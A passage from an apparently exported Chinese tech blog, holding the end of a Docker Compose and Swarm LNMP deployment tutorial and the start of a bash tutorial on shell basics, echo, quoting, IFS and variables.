同时连接了 frontend 和 backend 网络上。 连接到同一个网络的容器，可以进行互连；而不同网络的容器则会被隔离。所以在这个例子中，nginx 可以和 php 服务进行互连，php 也可以和 mysql 服务互连，因为它们连接到了同一个网络中；而 nginx 和 mysql 并不处于同一网络，所以二者无法通讯，这起到了隔离的作用。 处于同一网络的容器，可以使用服务名访问对方。比如，在这个例子中的 ./site/index.php 里，就是使用的 mysql 这个服务名去连接的数据库服务器。 12345&lt;?php// 建立连接$conn = mysqli_connect("mysql", "root", $_ENV["MYSQL_PASSWORD"]);...?&gt; 可以注意到，在这段数据库连接的代码里，数据库密码是通过环境变量，$_ENV[&quot;MYSQL_PASSWORD&quot;]，读取的，因此密码并非写死于代码中。在运行时，可以通过环境变量将实际环境的密码传入容器。在这个例子里，就是在 docker-compose.yml 文件中指定的环境变量： 12345678version: '2'services:... php:... environment: MYSQL_PASSWORD: Passw0rd... 关于 Docker 自定义网络，可以看一下官方文档的介绍：https://docs.docker.com/engine/userguide/networking/dockernetworks/#/user-defined-networks 关于在 Docker Compose 中使用自定义网络的部分，可以看官方这部分文档：https://docs.docker.com/compose/networking/ 存储在这三个服务中，nginx 和 php 都是无状态服务，它们都不需要本地存储。但是，mysql 是数据库，需要存储动态数据文件。我们知道 Docker 是要求容器存储层里不放状态，所有的状态（也就是动态的数据）的持久化都应该使用卷，在这里就是使用命名卷保存数据的。 12volumes: mysql-data: 在 docker-compose.yml 文件的后面，有一个全局的 volumes 配置部分，用于定义的是命名卷，这里我们定义了一个名为 mysql-data 的命名卷。这里卷的定义后还可以加一些卷的参数，比如卷驱动、卷的一些配置，而这里省略，意味着都使用默认值。也就是说使用 local 也就是最简单的本地卷驱动，将来建立的命名卷可能会位于 /var/lib/docker/volumes 下，不过不需要、也不应该直接去这个位置访问其内容。 在 mysql 服务的部分，同样有一个 volumes 配置，这里配置的是容器运行时需要挂载什么卷、或绑定宿主的目录。在这里，我们使用了之前定义的命名卷 mysql-data，挂载到容器的 /var/lib/mysql。 12345mysql: image: mysql:5.7 volumes: - mysql-data:/var/lib/mysql... 依赖服务的启动顺序有时候比较关键，Compose 在这里可以提供一定程度的启动控制。比如这个例子中，我是用了依赖关系 depends_on 来进行配置。 123456789101112services: nginx: ... depends_on: - php php: ... depends_on: - mysql mysql: ... 在这里，nginx 需要使用 php 服务，所以这里依赖关系上设置了 php，而 php 服务则需要操作 mysql，所以它依赖了 mysql。 在 docker-compose up -d 的时候，会根据依赖控制服务间的启动顺序，对于这个例子，则会以 mysql → php → nginx 的顺序启动服务。 需要注意的是，这里的启动顺序的控制是有限度的，并非彻底等到所依赖的服务可以工作后，才会启动下一个服务。而是确定容器启动后，则开始启动下一个服务。因此，这里的顺序控制可能依旧会导致某项服务启动时，它所依赖的服务并未准备好。比如 php 启动后，有可能会出现 mysql 服务的数据库尚未初始化完。对于某些应用来说，这个控制，依旧可能导致报错说无法连接所需服务。 如果需要应用级别的服务依赖等待，需要在 entrypoint.sh 这类脚本中，加入服务等待的部分。而且，也可以通过 restart: always 这种设置，让应用启动过程中，如果依赖服务尚未准备好，而报错退出后，有再一次尝试的机会。 此外，Docker 支持健康检查，在 docker-compose.yml v2 的格式下，可以要求依赖条件对方服务启动完成： 12depends_on: condition: service_healthy 进一步信息，请参考官网文档：https://docs.docker.com/compose/compose-file/compose-file-v2/#depends_on 单机操作启动1docker-compose up -d 如果构建过程中，发现镜像下载极为缓慢、甚至失败。这是伟大的墙在捣乱。你需要去配置加速器 如果修改了配置文件，可能需要明确重新构建，可以使用命令 docker-compose build。 查看服务状态1docker-compose ps 查看服务日志1docker-compose logs 访问服务nginx 将会守候 80 端口， 如果使用的 Linux 或者 Docker for Mac，可以直接在本机访问 http://localhost 如果是使用 Docker Toolbox 的话，则应该使用虚拟机地址，如 http://192.168.99.100，具体虚拟机地址查询使用命令 docker-machine ip default。 如果是自己安装的 Ubuntu、CentOS 类的虚拟机，直接进虚拟机查看地址。 如果访问后，看到了 成功连接 MySQL 服务器 就说明数据库连接正常。 停止服务1docker-compose down Swarm 集群编排在单机环境中使用容器，可能经常会用到绑定宿主目录的情况，这在开发时很方便。但是在集群环境中部署应用的时候，挂载宿主目录就变得非常不方便了。 在集群环境中，Swarm 可能会调度容器运行于任何一台主机上，如果一个主机失败后，可能还会再次调度到别的主机上，确保服务可以继续。在这种情况下，如果使用绑定宿主目录的形式，就必须同时在所有主机上的相同位置，事先准备好其内容，并且要保持同步。这并不是一个好的解决方案。 因此为了在集群环境中部署方便，比较好的做法是，将应用代码、配置文件等直接放入镜像。就如同这个例子中我们看到的 nginx、php 服务的镜像一样，在使用 Dockerfile 定制的过程中，将配置和应用代码放入镜像。 nginx 的服务镜像 Dockerfile 123...COPY ./nginx.conf /etc/nginx/conf.d/default.confCOPY ./site /usr/share/nginx/html php 的服务镜像 Dockerfile 123...COPY ./php.conf /usr/local/etc/php/conf.d/php.confCOPY ./site /usr/share/nginx/html Docker Swarm 目前分为两代。第一代是以容器形式运行，被称为 Docker Swarm；而第二代是自 1.12 以后以 SwarmKit 为基础集成进 docker 的 Swarm，被称为 Docker Swarm Mode。 一代 Swarm一代 Swarm 是 Docker 团队最早的集群编排的尝试，以容器形式运行，需要外置键值库（如 etcd, consul, zookeeper），需要手动配置 overlay 网络。其配置比 kubernetes 要简单，但是相比后面的第二代来说还是稍显复杂。 这里提供了一个脚本，run1.sh，用于建立一代 Swarm，以及启动服务、横向扩展。 建立 swarm 集群在安装有 docker-machine 以及 VirtualBox 的虚拟机上（比如装有 Docker Toolbox 的Mac/Windows），使用 run1.sh 脚本即可创建集群： 1./run1.sh create 启动1./run1.sh up 横向扩展1./run1.sh scale 3 5 这里第一个参数是 nginx 容器的数量，第二个参数是 php 容器的数量。 访问服务nginx 将会守候 80 端口。利用 docker ps 可以查看具体集群哪个节点在跑 nginx 以及 IP 地址。如 123456789101112$ eval $(./run1.sh env)$ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd85a2c26dd7d twang2218/lnmp-php:v1.2 "php-fpm" 9 minutes ago Up 9 minutes 9000/tcp node1/dockerlnmp_php_5c81e169c164d twang2218/lnmp-php:v1.2 "php-fpm" 9 minutes ago Up 9 minutes 9000/tcp node1/dockerlnmp_php_2b43de77c9340 twang2218/lnmp-php:v1.2 "php-fpm" 9 minutes ago Up 9 minutes 9000/tcp master/dockerlnmp_php_4fdcb718b6183 twang2218/lnmp-php:v1.2 "php-fpm" 9 minutes ago Up 9 minutes 9000/tcp node3/dockerlnmp_php_3764b10b17dc4 twang2218/lnmp-nginx:v1.2 "nginx -g 'daemon off" 9 minutes ago Up 9 minutes 192.168.99.104:80-&gt;80/tcp, 443/tcp master/dockerlnmp_nginx_3e92b34f998bf twang2218/lnmp-nginx:v1.2 "nginx -g 'daemon off" 9 minutes ago Up 9 minutes 192.168.99.106:80-&gt;80/tcp, 443/tcp node2/dockerlnmp_nginx_2077ee73c8148 twang2218/lnmp-nginx:v1.2 "nginx -g 'daemon off" 22 minutes ago Up 22 minutes 192.168.99.105:80-&gt;80/tcp, 443/tcp node3/dockerlnmp_nginx_11931249a66c1 e8920543aee8 "php-fpm" 22 minutes ago Up 22 minutes 9000/tcp node2/dockerlnmp_php_1cf71bca309dd mysql:5.7 "docker-entrypoint.sh" 22 minutes ago Up 22 minutes 3306/tcp node1/dockerlnmp_mysql_1 如这种情况，就可以使用 http://192.168.99.104, http://192.168.99.105, http://192.168.99.106 来访问服务。 停止服务1./run1.sh down 销毁集群1./run1.sh remove 二代 Swarm (Swarm Mode)二代 Swarm，既 Docker Swarm Mode，是自 1.12 之后引入的原生的 Docker 集群编排机制。吸取一代 Swarm 的问题，大幅改变了架构，并且大大简化了集群构建。内置了分布式数据库，不在需要配置外置键值库；内置了内核级负载均衡；内置了边界负载均衡。 和一代 Swarm 的例子一样，为了方便说明，这里提供了一个 run2.sh 来帮助建立集群、运行服务。 建立 swarm 集群在安装有 docker-machine 以及 VirtualBox 的虚拟机上（比如装有 Docker Toolbox 的Mac/Windows），使用 run2.sh 脚本即可创建集群： 1./run2.sh create 使用 Digital Ocean, AWS之类的云服务的话，就没必要本地使用 VirtualBox，不过需要事先配置好对应的 docker-machine 所需的环境变量。 启动1./run2.sh up 横向扩展1./run2.sh scale 10 5 这里第一个参数是 nginx 容器的数量，第二个参数是 php 容器的数量。 列出服务状态我们可以使用标准的命令列出所有服务以及状态： 12345$ docker service lsID NAME REPLICAS IMAGE COMMAND2lnqjas6rov4 mysql 1/1 mysql:5.7 mysqld --character-set-server=utf8ahqktnscjlkl php 5/5 twang2218/lnmp-php:v1.2bhoodda99ebt nginx 10/10 twang2218/lnmp-nginx:v1.2 我们也可以通过下面的命令列出具体的每个服务对应的每个容器状态： 1234567891011121314151617181920212223$ ./run2.sh ps+ docker service ps -f desired-state=running nginxID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR87xr5oa577hl9amelznpy7s7z nginx.1 twang2218/lnmp-nginx:v1.2 node2 Running Running 3 hours ago7dwmc22qaftz0xrvijij9dnuw nginx.2 twang2218/lnmp-nginx:v1.2 node3 Running Running 22 minutes ago00rus0xed3y851pcwkbybop80 nginx.3 twang2218/lnmp-nginx:v1.2 manager Running Running 22 minutes ago5ypct2dnfu6ducnokdlk82dne nginx.4 twang2218/lnmp-nginx:v1.2 manager Running Running 22 minutes ago7qshykjq8cqju0zt6yb9dkktq nginx.5 twang2218/lnmp-nginx:v1.2 node2 Running Running 22 minutes agoe2cux4vj2femrb3wc33cvm70n nginx.6 twang2218/lnmp-nginx:v1.2 node1 Running Running 22 minutes ago9uwbn5tm49k7vxesucym4plct nginx.7 twang2218/lnmp-nginx:v1.2 node1 Running Running 22 minutes ago6d8v5asrqwnz03hvm2jh96rq3 nginx.8 twang2218/lnmp-nginx:v1.2 node1 Running Running 22 minutes agoeh44qdsiv7wq8jbwh2sr30ada nginx.9 twang2218/lnmp-nginx:v1.2 node3 Running Running 22 minutes ago51l7nirwtv4gxnzbhkx6juvko nginx.10 twang2218/lnmp-nginx:v1.2 node2 Running Running 22 minutes ago+ docker service ps -f desired-state=running phpID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR4o3pqdva92vjdbfygdn0agp32 php.1 twang2218/lnmp-php:v1.2 manager Running Running 3 hours agobf3d6g4rr8cax4wucu9lixgmh php.2 twang2218/lnmp-php:v1.2 node3 Running Running 22 minutes ago9xq9ozbpea7evllttvyxk7qtf php.3 twang2218/lnmp-php:v1.2 manager Running Running 22 minutes ago8umths3p8rqib0max6b6wiszv php.4 twang2218/lnmp-php:v1.2 node2 Running Running 22 minutes ago0fxe0i1n2sp9nlvfgu4xlc0fx php.5 twang2218/lnmp-php:v1.2 node1 Running Running 22 minutes ago+ docker service ps -f desired-state=running mysqlID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR3ozjwfgwfcq89mu7tqzi1hqeu mysql.1 mysql:5.7 node3 Running Running 3 hours ago 访问服务nginx 将会守候 80 端口，由于二代 Swarm 具有边界负载均衡 (Routing Mesh, Ingress Load balance)，因此，集群内所有节点都会守护 80 端口，无论是 Manager 还是 Worker，无论是否有 nginx 容器在其上运行。当某个节点接到 80 端口服务请求后，会自动根据容器所在位置，利用 overlay 网络将请求转发过去。因此，访问任意节点的 80 端口都应该可以看到服务。 通过下面的命令可以列出所有节点，访问其中任意地址都应该可以看到应用页面： 12345$ ./run2.sh nodesmanager http://192.168.99.101node1 http://192.168.99.103node2 http://192.168.99.102node3 http://192.168.99.104 停止服务1./run2.sh down 销毁集群1./run2.sh remove]]></content>
      <categories>
        <category>系统运维</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>lnmp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell十五问--shell教程]]></title>
    <url>%2Flinux_ops%2F13_questions_of_shell%2F</url>
    <content type="text"><![CDATA[shell十五问之1: 何为shell？ 在我们回答 shell是什么东西之前，不妨让我们重新审视使用者和计算机系统的关系： 我们知道计算机的运作不能离开硬件，但使用者却无法直接操作硬件，硬件的驱动只能通过一种称为“操作系统(OS，Opertating System)”的软件来管控。事实上，我们每天所谈的“linux”，严格来说只是一个操作系统(OS),我们称之为“内核(kernel)”。 然而，从使用者的角度来说，使用者没有办法直接操作一个kernel，而是通过kernel的“外壳”程序，也就是所谓的shell，来与kernel沟通。这也正是kernel跟shell的形象命名的的关系。如图： 从技术的角度来说，shell是一个使用者与系统的交互界面(interface),只能让使用者通过命令行(command line)来使用系统来完成工作。因此，shell最简单的定义就是命令解释器( Command Interpreter): 将使用者的命令翻译给kernel来处理； 同时，将kernel的处理结果翻译给使用者。 每次当我们完成系统登入(login), 我们就取得一个交互模式的shell，也称之为login shell 或者 primary shell。若从进程(process)的角度来说，我们在shell所下达的命令，均是shell所产生的子进程。这种现象，我暂可称之为fork。如果是执行shell脚本(shell script)的话，脚本中命令则是由另一个非交互模式的子shell(sub shell)来执行的。也就是primary shell产生sub shell的进程，而该sub shell进程再产生script中所有命令的进程。 (关于进程，我们日后有机会在补充)这里， 我们必须知道：kernel 与 shell 是不同的两套软件，而且都是可以被替换的： 不同的OS使用不同的kernel; 同一个kernel之上，也可以使用不同的shell; 在Linux的预设系统中，通常可以找到好几种不同的shell,且通常会被记录在如下文件中：1/etc/shells 不同的shell有着不同的功能，且彼此各异，或者说“大同小异”。常见的shell主要分为两大主流： sh： burne shell (sh) burne again shell (bash) csh： c shell (csh) tc shell (tcsh) korn shell (ksh)(FIXME) 大部分的Linux操作系统的预设shell都是bash，其原因大致如下两种： 自由软件 功能强大 bash是gnu project最成功的产品之一，自推出以来深受广大Unix用户的喜爱，且也逐渐成为不少组织的系统标准。 shell十五问之2：shell prompt(PS1)与Carriage Return(CR)关系 当你成功登陆一个shell终端的文字界面之后，大部分的情形下，你会在屏幕上看到一个不断闪烁的方块或者底线(视不同的版本而别)，我们称之为游标(cursor)。cursor作用就是告诉你接下来你从键盘输入的按键所插入的位置，且每输入一个键，cursor便向右移动一个格子，如果连续输入太多的话，则自动接在下一行输入。 假如你刚完成登陆，还没有输入任何按键之前，你所看到的cursor所在的位置的同一行的左边部分，我们称之为提示符(prompt)。 提示符的格式或因不同的版本而各有不同，在Linux上，只需留意最接近游标的一个提示符号，通常是如下两者之一： $: 给一般用户账号使用; #: 给root(管理员)账号使用; 事实上，shell prompt的意思很简单：告诉shell使用者，您现在可以输入命令行了。 我们可以说，使用者只有在得到shell prompt才能打命令行，而cursor是指示键盘在命令行的输入位置，使用者每输入一个键，cursor就往后移动一个格，直到碰到命令行读进CR(Carriage Return, 由Enter键产生)字符为止。 CR的意思也很简单：使用者告诉shell：老兄，你可以执行的我命令行了。严格来说：所谓的命令行， 就是在shell prompt与CR之间所输入的文字。 (question：为何我们这里坚持使用CR字符而不说Enter按键呢？答案在后面的学习中给出)。 不同的命令可以接受的命令的格式各有不同，一般情况下，一个标准的命令行格式为如下所列：1command-name options argument 若从技术的细节上来看，shell会依据IFS(Internal Field Seperator) 将 command line所输入的文字给拆解为字段(word)。然后在针对特殊的字符(meta)先做处理，最后在重组整行command line。 (注意：请务必理解以上两句的意思，我们日后的学习中常回到这里思考。) 其中IFS是shell预设使用的字段位分隔符号，可以由一个及多个如下按键组成： 空白键(White Space) 表格键(Tab) 回车键(Enter) 系统可以接受的命令的名称(command-name)可以从如下途径获得： 确的路径所指定的外部命令 命令的别名(alias) shell内建命令(built-in) $PATH之下的外部命令 每一个命令行均必须包含命令的名称，这是不能缺少的。 shell十五问之3：别人echo、你也echo，是问echo知多少？ 承接上一章介绍的command line, 这里我们用echo这个命令加以进一步说明。 温习 标准的command line三个组成部分：command_name option argument echo是一个非常简单、直接的Linux命令： 1$echo argument echo将argument送出到标准输出(stdout),通常是在监视器(monitor)上输出。 Note： 在linux系统中任何一个进程默认打开三个文件：stdin、stdout、stderr. stdin 标准输入 stdout 标准输出 stderr 标准错误输出 为了更好理解，不如先让我们先跑一下echo命令好了：123$echo$ 你会发现只有一个空白行，然后又回到了shell prompt上了。这是因为echo在预设上，在显示完argument之后，还会送出以一个换行符号(new-line charactor)。但是上面的command echo并没有任何argument，那结果就只剩一个换行符号。若你要取消这个换行符号， 可以利用echo的-n 选项:12$echo -n$ 不妨让我们回到command line的概念上来讨论上例的echo命令好了：command line只有command_name(echo)及option(-n),并没有显示任何argument。 要想看看echo的argument，那还不简单接下来，你可以试试如下的输入：1234$echo first linefirst line$echo -n first linefirst line $ 以上两个echo命令中，你会发现argument的部分显示在你的屏幕，而换行符则视 -n 选项的有无而别。很明显的，第二个echo由于换行符被取消了，接下来的shell prompt就接在输出结果的同一行了… ^_^。 事实上，echo除了-n 选项之外，常用选项有： -e: 启用反斜杠控制字符的转换(参考下表) -E: 关闭反斜杠控制字符的转换(预设如此) -n: 取消行末的换行符号(与-e选项下的\c字符同意) 关于echo命令所支持的反斜杠控制字符如下表： 转义字符 字符的意义 \a ALERT / BELL(从系统的喇叭送出铃声) \b BACKSPACE, 也就是向左退格键 \c 取消行末之换行符号 \E ESCAPE, 脱字符键 \f FORMFEED, 换页字符 \n NEWLINE, 换行字符 \r RETURN, 回车键 \t TAB, 表格跳位键 \v VERTICAL TAB, 垂直表格跳位键 \n ASCII 八进制编码(以x开头的为十六进制)，此处的n为数字 \ 反斜杠本身 Note：上述表格的资料来自O’Reilly出版社的Learning the Bash Shell, 2nd Ed. 或许，我们可以通过实例来了解echo的选项及控制字符： 例一：1234$ echo -e "a\tb\tc\n\d\te\tf"a b cd e f$ 上例中，用\t来分割abc还有def，及用\n将def换至下一行。 例二：123$echo -e "\141\011\142\011\143\012\144\011\145\011\146"a b cd e f 与例一中结果一样，只是使用ASCII八进制编码。 例三：123$echo -e "\x61\x09\x62\x09\x63\x0a\x64\x09\x65\x09\x66"a b cd e f 与例二差不多，只是这次换用ASCII的十六进制编码。 例四：123$echo -ne "a\tb\tc\nd\te\bf\a"a b cd f $ 因为e字母后面是退格键(\b)，因此输出结果就没有e了。在结束的时听到一声铃响，是\a的杰作。由于同时使用了-n选项，因此shell prompt紧接在第二行之后。若你不用-n的话，那你在\a后再加个\c，也是同样的效果。 事实上，在日后的shell操作及shell script设计上，echo命令是最常被使用的命令之一。比方说，使用echo来检查变量值：12345$ A=B$ echo $AB$ echo $?0 Note: 关于变量的概念，我们留到以下的两章跟大家说明。 好了，更多的关于command line的格式， 以及echo命令的选项，请您自行多加练习、运用了。 shell十五问之4：””(双引号)与’’(单引号)差在哪？ 还是回到我们的command line来吧。 经过前面两章的学习，应该很清楚当你在shell prompt后面敲打键盘,直到按下Enter键的时候，你输入的文字就是command line了，然后shell才会以进程的方式执行你所交给它的命令。但是，你又可知道：你在command line中输入的每一个文字，对shell来说，是有类别之分的呢？ 简单而言，(我不敢说精确的定义，注1),command line的每一个charactor, 分为如下两种： literal：也就是普通的纯文字，对shell来说没特殊功能； meta: 对shell来说，具有特定功能的特殊保留元字符。 Note: 对于bash shell在处理comamnd line的顺序说明，请参考O’Reilly出版社的Learning the Bash Shell，2nd Edition，第177-180页的说明，尤其是178页的流程图：Figure 7-1。 literal没什么好谈的，像abcd、123456这些文字都是literal。(so easy? ^_^)但meta却常使我们困惑。(confused?)事实上，前两章，我们在command line中已碰到两个似乎每次都会碰到的meta： IFS：有space或者tab或者Enter三者之一组成(我们常用space) CR： 由Enter产生； IFS是用来拆解command line中每一个词(word)用的，因为shell command line是按词来处理的。而CR则是用来结束command line用的，这也是为何我们敲Enter键，命令就会跑的原因。除了常用的IFS与CR, 常用的meta还有： meta字符 meta字符作用 = 设定变量 $ 作变量或运算替换(请不要与shell prompt混淆) &gt; 输出重定向(重定向stdout) &lt; 输入重定向(重定向stdin) &amp; 重定向file descriptor或将命令至于后台(bg)运行 () 将其内部的命令置于nested subshell执行，或用于运算或变量替换 {} 将期内的命令置于non-named function中执行，或用在变量替换的界定范围 ; 在前一个命令执行结束时，而忽略其返回值，继续执行下一个命令 &amp;&amp; 在前一个命令执行结束时，若返回值为true，继续执行下一个命令 ! 执行histroy列表中的命令 … … 补充：|是命令管道，而||的意思是在前一个命令执行结束时，若返回值为false，继续执行下一个命令。 假如我们需要在command line中将这些保留元字符的功能关闭的话，就需要quoting处理了。 在bash中，常用的quoting有以下三种方法： hard quote：’’(单引号)，凡在hard quote中的所有meta均被关闭； soft quote：””(双引号)，凡在soft quote中大部分meta都会被关闭，但某些会保留(如$); escape: \ (反斜杠)，只有在紧接在escape(跳脱字符)之后的单一meta才被关闭； Note: 在soft quote中被豁免的具体meta清单，我不完全知道，有待大家补充，或通过实践来发现并理解。 下面的例子将有助于我们对quoting的了解：1234567$ A=B C #空格键未被关掉，作为 IFS 处理。$ C：command not found.$ echo $A$ A="B C" #空格键已被关掉，仅作为空格键处理。$ echo $AB C 在第一个给A变量赋值时，由于空白符没有被关闭，command line 将被解释为： A=B 然后碰到&lt;IFS&gt;，接着执行C命令 在第二次给A变量赋值时，由于空白符被置于soft quote中，因此被关闭，不在作为IFS： A=B&lt;space&gt;C 事实上，空白符无论在soft quote还是在hard quote中，均被关闭。Enter键字符亦然： 123456$ A=`B&gt; C&gt; '$ echo "$A"BC 在上例中，由于enter被置于hard quote当中，因此不再作为CR字符来处理。这里的enter单纯只是一个断行符号(new-line)而已，由于command line并没得到CR字符，因此进入第二个shell prompt(PS2, 以&gt;符号表示)，command line并不会结束，直到第三行，我们输入的enter并不在hard quote里面，因此没有被关闭。此时，command line碰到CR字符，于是结束，交给shell来处理。 上例的Enter要是被置于soft quote中的话，CR字符也会同样被关闭： 12345$ A="B&gt; C&gt; "$ echo $AB C 然而，由于 echo $A时的变量没有置于soft quote中，因此，当变量替换完成后，并作命令行重组时，enter被解释为IFS，而不是new-line字符。 同样的，用escape亦可关闭CR字符：12345$ A=B\&gt; C\&gt;$ echo $ABC 上例中的，第一个enter跟第二个enter均被escape字符关闭了，因此也不作为CR来处理，但第三个enter由于没有被escape，因此，作为CR结束command line。但由于enter键本身在shell meta中特殊性，在 \ escape字符后面仅仅取消其CR功能， 而不保留其IFS功能。 你或许发现光是一个enter键所产生的字符，就有可能是如下这些可能： CR IFS NL(New Line) FF(Form Feed) NULL … 至于，什么时候解释为什么字符，这个我就没法去挖掘了，或者留给读者君自行慢慢摸索了。 至于soft quote跟hard quote的不同，主要是对于某些meta的关闭与否，以$来做说明：12345$ A=B\ C$ echo "$A"B C$ echo '$A'$A 在第一个echo命令行中，$被置于soft quote中，将不被关闭，因此继续处理变量替换，因此，echo将A的变量值输出到屏幕，也就是B C的结果。 在第二个echo命令行中，$被置于hard quote中，则被关闭，因此，$只是一个$符号，并不会用来做变量替换处理，因此结果是$符号后面接一个A字母：$A。 练习与思考:如下结果为何不同？ tips: 单引号和双引号，在quoting中均被关闭了。 12345$ A=B\ C$ echo '"$A"' #最外面的是单引号"$A"$ echo "'$A'" #最外面的是双引号'B C' 比方说，若我们在awk或sed的命令参数中，调用之前设定的一些变量时，常会问及为何不能的问题。 要解决这些问题，关键点就是：区分出 shell meta 与 command meta 前面我们提到的那些meta，都是在command line中有特殊用途的，比方说{}就是将一系列的command line置于不具名的函数中执行(可简单视为command block)。但是，awk却需要用{}来区分出awk的命令区段(BEGIN,MAIN,END)。若你在command line中如此输入：1$ awk &#123;print $0&#125; 1.txt 由于{}在shell中并没有关闭，那shell就将{print $0}视为command block，但同时没有;符号作命令分隔，因此，就出现awk语法错误结果。 要解决之，可用hard quote:1awk '&#123;print $0&#125;' 1.txt 上面的hard quote应好理解，就是将原来的{、&lt;space&gt;、$、}这几个shell meta关闭，避免掉在shell中遭到处理，而完整的成为awk的参数中command meta。 Note: awk中使用的$0是awk中内建的field nubmer，而非awk的变量，awk自身的变量无需使用$。 要是理解了hard quote的功能，在来理解soft quote与escape就不难：12awk "&#123;print \$0&#125;" 1.txtawk \&#123;print \$0\&#125; 1.txt 然而，若要你改变awk的$0的0值是从另一个shell变量中读进呢？比方说：已有变量$A的值是0， 那如何在command line中解决awk的$$A呢？你可以很直接否定掉hard quote的方案：1$ awk '&#123;print $$A&#125;' 1.txt 那是因为$A的$在hard quote中是不能替换变量的。 聪明的读者(如你！)，经过本章的学习，我想，你应该可以理解为何我们可以使用如下操作了吧：12345A=0awk "&#123;print \$$A&#125;" 1.txtawk \&#123;print\ \$$A\&#125; 1.txtawk '&#123;print $'$A'&#125;' 1.txtawk '&#123;print $'"$A"'&#125;' 1.txt 或许，你能给出更多方案… ^_^ 一个关于read命令的小问题：很早以前觉得很奇怪：执行read命令，然后读取用户输入给变量赋值，但如果输入是以空格键开始的话，这空格会被忽略，比如：12read a #输入： abcecho "$a" #只输出abc 原因: 变量a的值，从终端输入的值是以IFS开头，而这些IFS将被shell解释器忽略(trim)。 应该与shell解释器分词的规则有关； 12read a #输入：\ \ \ abcecho "$a" #只输出abc 需要将空格字符转义 Note: IFS Internal field separators, normally space, tab, and newline (see Blank Interpretation section). …… Blank Interpretation After parameter and command substitution, the results of substitution are scanned for internal field separator characters (those found in IFS) and split into distinct arguments where such characters are found. Explicit null arguments (“” or ‘’) are retained. Implicit null arguments(those resulting from parameters that have no values) are removed. (refre to: man sh) 解决思路： shell command line 主要是将整行line给分解(break down)为每一个单词(word); 而词与词之间的分隔符就是IFS (Internal Field Seperator)。 shell会对command line作处理(如替换，quoting等), 然后再按词重组。(注：别忘了这个重组特性) 当你用IFS来事开头一个变量值，那shell会先整理出这个词，然后在重组command line。 然而，你将IFS换成其他，那shell将视你哪些space/tab为“词”，而不是IFS。那在重组时，可以得到这些词。 若你还是不理解，那来验证一下下面这个例子：123456789101112$ A=" abc" $ echo $Aabc$ echo "$A" #note1 abc$ old_IFS=$IFS$ IFS=;$ echo $A abc$ IFS=$old_IFS$ echo $Aabc Note: 这里是用 soft quoting 将里面的 space 关闭，使之不是 meta(IFS)，而是一个literal(white space); IFS=; 意义是将IFS设置为空字符，因为;是shell的元字符(meta); 问题二：为什么多做了几个分号，我想知道为什么会出现空格呢？12345678910$ a=";;;test" $ IFS=";" $ echo $a test $ a=" test" $ echo $a test $ IFS=" " $ echo $a test 解答： 这个问题，出在IFS=;上。因为这个;在问题一中的command line上是一个meta,并非&quot;;&quot;符号本身。因此，IFS=;是将IFS设置为 null charactor(不是space、tab、newline)。 要不是试试下面这个代码片段：12345678$ old_IFS=$IFS$ read A;a;b;c$ echo $A;a;b;c$ IFS=";" #Note2$ echo $Aa b c Note: 要关闭;可用&quot;;&quot;或者&#39;;&#39;或者\;。 思考问题二：文本处理：读文件时，如何保证原汁原味。1234cat file | while read ido echo $idone 文件file的行中包含若干空，经过read只保留不重复的空格。如何才能所见即所得。 1234cat file | while read ido echo "X$&#123;i&#125;X"done 从上面的输出，可以看出read，读入是按整行读入的，不能原汁原味的原因： 如果行的起始部分有IFS之类的字符，将被忽略; echo $i的解析过程中，首先将$i替换为字符串，然后对echo字符串中字符串分词，然后命令重组，输出结果;在分词，与命令重组时，可能导致多个相邻的IFS转化为一个; 1234cat file | while read ido echo "$i"done 以上代码可以解决原因2中的，command line的分词和重组导致meta字符丢失；但仍然解决不了原因1中read读取行时，忽略行起始的IFS meta字符。 回过头来看上面这个问题：为何要原汁原味呢？cat命令就是原汁原味的，只是shell的read、echo导致了某些shell的meta字符丢失; 如果只是IFS meta的丢失，可以采用如下方式：将IFS设置为null，即IFS=;, 在此再次重申此处;是shell的meta字符，而不是literal字符;因此要使用literal的;应该是\;或者关闭meta 的(soft/hard) quoting的&quot;;&quot;或者&#39;;&#39;。 因此上述的解决方案是：1234567old_IFS=$IFSIFS=; #将IFS设置为nullcat file | while read ido echo "$i"doneIFS=old_IFS #恢复IFS的原始值 现在，回过头来看这个问题，为什么会有这个问题呢；其本源的问题应该是没有找到解决原始问题的最合适的方法，而是采取了一个迂回的方式来解决了问题； 因此，我们应该回到问题的本源，重新审视一下，问题的本质。如果要精准的获取文件的内容，应该使用od或者hexdump会更好些。 shell十五问之5:问var=value 在export前后的差在哪? 这次让我们暂时丢开command line, 先了解一下bash变量(variable)吧。 所谓的变量，就是利用一个固定的名称(name),来存取一段可以变化的值(value)。 1. 变量设定(set)在bash中， 你可以用=来设定或者重新定义变量的内容：1name=value 在设定变量的时候，得遵守如下规则： 等号左右两边不能使用分隔符号(IFS),也应避免使用shell的保留元字符(meta charactor); 变量的名称(name)不能使用$符号; 变量的名称(name)的首字符不能是数字(number)。 变量的名称(name)的长度不可超过256个字符。 变量的名称(name)及变量的值的大小写是有区别的、敏感的(case sensitive，) 如下是一些变量设定时常见的错误：1234A= B #=号前后不能有IFS1A=B #变量名称不能以数字开头$A=B #变量的名称里有$a=B #这跟a=b是不同的,(这不是错误，提醒windows用户) 如下则是可以接受的设定：1234A=" B" #IFS被关闭，参考前面的quoting章节A1=B #并非以数字开头A=$B #$可用在变量的值内This_Is_A_Long_Name=b #可用_连接较长的名称或值，且有大小区别； 2. 变量替换(substitution)shell之所以强大，其中的一个因素是它可以在命令行中对变量作替换(substitution)处理。在命令行中使用者可以使用$符号加上变量名称(除了用=定义变量名称之外)，将变量值给替换出来，然后再重新组建命令行。 比方:1234$ A=ls$ B=la$ C=/tmp$ $A -$B $C 以上命令行的第一个$是shell prompt, 并不在命令行之内。必须强调的是，我们所提的变量替换，只发生在command line上面。是的，请让我们再次回到命令行吧！仔细分析,最后那行command line,不难发现在被执行前(在输入CR字符之前)，$符号对每一个变量作替换处理(将变量的值替换出来再重组命令行),最后会得出如下结果：1ls -la /tmp 还记得第二章，我请大家务必理解的那两句吗？若你忘了，我这里重贴一遍： Note: 若从技术的细节来看，shell会依据IFS(Internal Field Seperator)将command line所输入的文字拆解为字段(word/field)。然后再针对特殊字符(meta)先作处理，最后重组整行command line。 这里的$就是command 